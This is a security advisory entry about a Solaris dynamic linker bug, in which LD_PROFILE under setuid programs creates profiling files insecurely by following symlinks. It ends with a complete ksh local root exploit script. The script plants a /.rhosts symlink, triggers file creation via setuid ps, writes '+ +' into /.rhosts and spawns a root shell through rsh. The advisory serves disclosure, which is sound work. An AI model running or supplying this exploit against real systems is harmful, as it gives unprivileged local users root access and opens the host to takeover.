source: http://www.securityfocus.com/bid/659/info

A vulnerability in the dynamic linkers while profiling a shared object allows local users to create arbitrary files in the system. It canno't be used to overwrite existing files.

If the LD_PROFILE environment variable is defined it instructs the dynamic linker to profile the shared object defined by it. When profiling is enabled, a profiling buffer file is created and mapped. The name of the buffer file is the name of the shared object being profiled with a .profile extension. By default this buffer is placed under /var/tmp.

The dynamic linker created the buffer file insecurely in the case where it runs in the context of a setuid application. It follows symbolic links while creating the file.

This is Sun BugID 4150646. This is the same bug as Sun BugID 1241843. The new instance was introduced after an extensive rewrite of the dynamic linker. The problem was originally fixed in Solaris 2.5.1 and back patched. It was reintroduced in 2.6 and back patched into 2.5.1. 

#! /bin/ksh
# LD_PROFILE local root exploit for solaris
# steve@tightrope.demon.co.uk 19990922
umask 000
ln -s /.rhosts /var/tmp/ps.profile
export LD_PROFILE=/usr/bin/ps
/usr/bin/ps
echo + + > /.rhosts
rsh -l root localhost csh -i


